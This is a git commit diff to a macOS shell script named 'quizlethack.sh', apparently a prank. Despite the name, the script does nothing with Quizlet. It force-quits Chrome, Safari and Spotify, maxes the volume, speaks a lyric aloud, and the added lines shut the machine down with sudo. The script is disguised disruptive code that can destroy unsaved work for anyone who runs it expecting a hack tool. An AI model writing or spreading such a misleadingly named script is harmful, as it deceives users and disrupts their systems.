b9a0b6f7e6355e83ca3d4af9ba7a78d4781a573e
N E X U S <167659471+hoursinblack@users.noreply.github.com>
2025-05-26 14:06:17 +0700

    Update quizlethack.sh

--- quizlethack.sh
+++ quizlethack.sh
@@ -1,13 +1,19 @@
 #!/bin/bash
 
-# Instantly quit Chrome
+# Quit key apps
 osascript -e 'quit app "Google Chrome"'
+osascript -e 'quit app "Safari"'
+osascript -e 'quit app "Spotify"'
 
-# Set system volume to max
+# Set volume to max
 osascript -e 'set volume output volume 100'
 
-# Wait for dramatic effect
+# Wait 2 seconds
 sleep 2
 
-# Speak the message
-say "king von is so back"
+# Speak the line
+say "police steady watching me every day they clocking me"
+
+# Shutdown the Mac
+sudo shutdown -h now
+
